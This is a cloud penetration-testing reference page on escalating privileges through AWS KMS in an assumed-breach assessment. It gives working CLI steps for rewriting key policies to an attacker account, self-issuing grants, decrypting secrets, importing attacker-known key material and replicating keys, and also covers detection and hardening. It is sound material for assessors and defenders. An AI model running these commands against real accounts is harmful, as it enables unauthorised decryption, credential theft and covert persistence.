---
cstg_id: CSTG-AWS-KMS-PRIVESC
title: "AWS Kms - Privilege Escalation"
provider: aws
service: kms
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - kms:PutKeyPolicy
  - kms:CreateGrant
  - kms:Decrypt
  - kms:Encrypt
  - kms:GenerateDataKey
  - kms:ReEncryptFrom
  - kms:ReEncryptTo
  - kms:CreateKey
  - kms:ImportKeyMaterial
  - kms:GetParametersForImport
  - kms:ReplicateKey
  - kms:UpdatePrimaryRegion
references:
  - "https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html"
  - "https://docs.aws.amazon.com/kms/latest/developerguide/grants.html"
  - "https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html"
  - "https://docs.aws.amazon.com/kms/latest/APIReference/API_PutKeyPolicy.html"
  - "https://docs.aws.amazon.com/kms/latest/APIReference/API_CreateGrant.html"
  - "https://hackingthe.cloud/aws/exploitation/"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation through AWS KMS is fundamentally about converting control
over a key, or use of a key, into access to the data that key protects — and, in
the cross-account case, into a foothold in another account. KMS does not grant
IAM permissions like `iam:CreatePolicyVersion` does; instead, "escalation" here
means crossing the cryptographic boundary: gaining `Decrypt`/`GenerateDataKey`
on a key you were not meant to use (often via `kms:PutKeyPolicy` or
`kms:CreateGrant`), thereby unlocking secrets, snapshots, parameter-store values,
and S3 objects that themselves contain credentials or grant further access. A key
that protects a Secrets Manager database credential, an EBS snapshot of a domain
controller, or a CloudTrail/CI key is effectively a master switch.

This page enumerates the KMS permissions that enable escalation and the concrete
path each one creates. The attacker objective is: (1) obtain decryption rights
over high-value ciphertext, (2) chain decrypted material into IAM/credential
access, and (3) where possible pivot cross-account by re-pointing a key policy at
a principal under attacker control. See
[AWS KMS - Enumeration](../02-services/aws-kms-enum.md) for discovering which
keys gate which data.

## Prerequisites

Assumed-breach: the assessor holds credentials for a principal (IAM user or
assumed role) in the target account and is evaluating whether its KMS-related
permissions enable escalation. Each subsection below names the single permission
(or minimal set) that enables the path. KMS is regional; a permission grants the
path only on keys in Regions and with key policies that do not separately deny
the action. Note the dual-authorization model: for customer-managed keys, an
action is allowed if permitted by **either** the key policy **or** an applicable
IAM policy (when the key policy delegates to IAM via the
"Enable IAM User Permissions" statement). A principal with only IAM `kms:*` over
a key whose policy does not delegate to IAM will be denied — always verify
against the key policy collected during enumeration.

## Enumeration

Confirm the principal's own KMS permissions and the keys it can reach:

```bash
aws sts get-caller-identity
# What the principal is allowed to do (simulate against KMS actions)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<account>:role/<role> \
  --action-names kms:PutKeyPolicy kms:CreateGrant kms:Decrypt \
    kms:GenerateDataKey kms:ReEncryptFrom kms:CreateKey kms:ImportKeyMaterial \
  --resource-arns arn:aws:kms:us-east-1:<account>:key/<key-id>

# Whether the key policy delegates to IAM and what it already allows
aws kms get-key-policy --key-id <key-id> --policy-name default --output text
```

## Misconfigurations & Findings

- A principal holding `kms:PutKeyPolicy` on a high-value key: it can rewrite the
  key policy to grant itself (or any principal) full use.
- A principal holding `kms:CreateGrant` on a key: it can grant itself or another
  principal `Decrypt`/`GenerateDataKey` without touching the key policy.
- A principal with `kms:Decrypt`/`kms:ReEncryptFrom` on a key that protects
  secrets/snapshots it can also read: direct data access with no escalation
  needed.
- IAM-delegating key policies combined with permissive IAM, letting an unrelated
  IAM permission set govern the key.
- `kms:CreateKey` + `kms:ImportKeyMaterial` permitting creation of an
  attacker-controlled key for re-encryption pivots or persistence.

## Exploitation

### kms:PutKeyPolicy

`PutKeyPolicy` overwrites the entire resource policy of a key. A principal with
this permission on a high-value customer-managed key can append (or replace with)
a statement granting itself, or any principal it controls (including a
cross-account principal), full use of the key.

```bash
# 1. Read current policy to preserve the IAM-delegation statement
aws kms get-key-policy --key-id <key-id> --policy-name default \
  --output text > policy.json

# 2. Add a statement granting the controlled principal Decrypt/GenerateDataKey
#    (edit policy.json to include, alongside existing statements):
#   {
#     "Sid": "audit-access",
#     "Effect": "Allow",
#     "Principal": {"AWS": "arn:aws:iam::<attacker-account>:role/<role>"},
#     "Action": ["kms:Decrypt","kms:GenerateDataKey","kms:ReEncrypt*","kms:DescribeKey"],
#     "Resource": "*"
#   }

# 3. Apply
aws kms put-key-policy --key-id <key-id> --policy-name default \
  --policy file://policy.json

# 4. Now decrypt the protected data (e.g., a Secrets Manager value or snapshot key)
aws kms decrypt --key-id <key-id> --ciphertext-blob fileb://ciphertext.bin \
  --query Plaintext --output text | base64 --decode
```

This is the strongest KMS escalation: it converts administrative control of one
key into use of that key, and is the primary cross-account pivot when the policy
is re-pointed at an external account the assessor controls. Replacing rather than
appending (dropping the "Enable IAM User Permissions" statement) can also lock
out legitimate administrators — avoid this in live engagements as it is
destructive and an availability risk.

### kms:CreateGrant

`CreateGrant` delegates a subset of operations on a key to a grantee principal
without modifying the key policy and is far quieter than `PutKeyPolicy`. A
principal with `kms:CreateGrant` on a key can grant itself (or another principal)
`Decrypt`, `GenerateDataKey`, and even `CreateGrant` (to chain further).

```bash
aws kms create-grant --key-id <key-id> \
  --grantee-principal arn:aws:iam::<account>:role/<controlled-role> \
  --operations Decrypt GenerateDataKey ReEncryptFrom DescribeKey CreateGrant
# Returns GrantId and GrantToken; the grantee can now use the key:
aws kms decrypt --key-id <key-id> --ciphertext-blob fileb://ciphertext.bin \
  --query Plaintext --output text | base64 --decode
```

Grants are subject to eventual consistency; the returned `GrantToken` can be
passed to KMS calls to use the grant immediately. Because grants do not appear in
the key policy, they are a common blind spot for reviewers — see also the
[Persistence](../06-persistence/aws-kms-persistence.md) page.

### kms:Decrypt / kms:ReEncryptFrom

Direct use permissions are themselves an escalation path when the same principal
can read the corresponding ciphertext. The classic chain: read an encrypted
Secrets Manager secret, an SSM `SecureString`, an EBS snapshot, or an S3 object,
then `Decrypt` it under the governing key to recover credentials that grant
broader access.

```bash
# Secrets Manager performs the Decrypt for you if you can read the secret and use the key
aws secretsmanager get-secret-value --secret-id <secret> --query SecretString

# SSM SecureString
aws ssm get-parameter --name <param> --with-decryption --query Parameter.Value

# Generic envelope ciphertext recovered from storage
aws kms decrypt --ciphertext-blob fileb://blob.bin --query Plaintext --output text \
  | base64 --decode
```

`ReEncryptFrom` (paired with `ReEncryptTo` on a destination key) lets ciphertext
be moved under a different key without exposing plaintext to the API caller —
useful for relocating data under an attacker-controlled key to retain access even
if the original key's policy is later tightened.

### kms:GenerateDataKey

For services using envelope encryption, `GenerateDataKey`/`GenerateDataKeyPair`
yields a plaintext data key plus its ciphertext form. A principal that can both
write to an encrypted store and call `GenerateDataKey` can craft data the store
will accept, and recover/forge envelope keys. In combination with `Decrypt`, it
provides full read/write capability over envelope-encrypted data.

### kms:CreateKey + kms:ImportKeyMaterial

A principal that can create a key and import key material can establish an
attacker-controlled key whose material is known externally. Combined with
`ReEncryptTo`, data can be re-encrypted under this key so that the assessor's
out-of-band copy of the material can decrypt ciphertext independently of AWS
authorization — a powerful, durable access path.

```bash
aws kms create-key --origin EXTERNAL --key-usage ENCRYPT_DECRYPT
aws kms get-parameters-for-import --key-id <new-key> \
  --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048
# (wrap externally-held material with the returned public key, then import)
aws kms import-key-material --key-id <new-key> \
  --encrypted-key-material fileb://wrapped.bin --import-token fileb://token.bin \
  --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
```

### kms:ReplicateKey / kms:UpdatePrimaryRegion

For multi-Region keys, `ReplicateKey` creates a replica with the same material in
another Region — where monitoring or restrictive policies may be weaker — and the
replica's policy is set at creation, allowing the creator to grant itself use.
`UpdatePrimaryRegion` shifts which Region holds the primary, a control-plane
manipulation that can move administration to a less-monitored Region.

```bash
aws kms replicate-key --key-id <mrk-primary> --replica-region us-west-2 \
  --policy file://attacker-policy.json
```

## Detection & Logging

All of these actions are logged to CloudTrail under
`eventSource: kms.amazonaws.com`:

- `PutKeyPolicy` — highest-signal: a key-policy change is rare and should be
  alarmed, especially one adding a new principal or a cross-account
  `Principal`.
- `CreateGrant` / `RetireGrant` / `RevokeGrant` — grant lifecycle; correlate
  `GranteePrincipal` against expected service principals.
- `CreateKey`, `ImportKeyMaterial`, `GetParametersForImport`, `ReplicateKey`,
  `UpdatePrimaryRegion` — key-lifecycle and BYOK activity.
- `Decrypt`, `ReEncryptFrom`/`ReEncryptTo`, `GenerateDataKey*` — usage events;
  anomalous principal, volume, or `encryptionContext` is the detection.

`userIdentity` identifies the calling principal; `requestParameters` and
`resources` carry the key ARN. Detective controls: AWS Config managed rules,
CloudWatch alarms or EventBridge rules on `PutKeyPolicy`/`CreateGrant`, and
IAM Access Analyzer to flag key policies newly shared cross-account. A
`PutKeyPolicy` that introduces `"Principal": {"AWS": "*"}` or an external account
should page immediately.

```
filter eventSource = "kms.amazonaws.com"
  and eventName in ["PutKeyPolicy","CreateGrant","ReplicateKey","UpdatePrimaryRegion"]
| fields eventTime, userIdentity.arn, eventName, requestParameters.keyId
```

## Remediation & Hardening

- Never grant `kms:PutKeyPolicy`, `kms:CreateGrant`, `kms:ScheduleKeyDeletion`,
  or `kms:ReplicateKey` to principals that only need to use keys. Separate key
  administration from key usage and avoid `kms:*`.
- Constrain key use with `kms:ViaService`, `kms:CallerAccount`, `aws:SourceArn`,
  and `kms:EncryptionContext:*` conditions so a stolen grant or rewritten policy
  cannot be used outside the intended service/data path.
- Use SCPs to deny `kms:PutKeyPolicy`/`kms:CreateGrant` outside a break-glass
  role, and to deny cross-account principals in key policies organization-wide.
- Alarm on `PutKeyPolicy` and `CreateGrant`; require change-management review for
  any key-policy modification.
- Audit grants continuously and set retiring principals so stale grants can be
  retired; prefer short-lived grants with encryption-context constraints.
- Run IAM Access Analyzer to detect keys exposed cross-account, and review
  multi-Region key replicas in every Region.

## Tools

- AWS CLI (`aws kms`) and KMS API for all of the above operations.
- IAM policy simulators and permission-enumeration tooling to identify which
  KMS escalation permissions a principal holds.
- IAM-graph / attack-path analysis tooling that models KMS key policies and
  grants as edges into the data they protect.

## References

- AWS KMS Developer Guide — Key policies:
  https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html
- AWS KMS Developer Guide — Grants:
  https://docs.aws.amazon.com/kms/latest/developerguide/grants.html
- AWS KMS Developer Guide — Importing key material:
  https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html
- AWS KMS API Reference — PutKeyPolicy:
  https://docs.aws.amazon.com/kms/latest/APIReference/API_PutKeyPolicy.html
- AWS KMS API Reference — CreateGrant:
  https://docs.aws.amazon.com/kms/latest/APIReference/API_CreateGrant.html
- AWS KMS Developer Guide — Multi-Region keys:
  https://docs.aws.amazon.com/kms/latest/developerguide/multi-region-keys-overview.html
- Hacking the Cloud — AWS exploitation techniques:
  https://hackingthe.cloud/aws/exploitation/
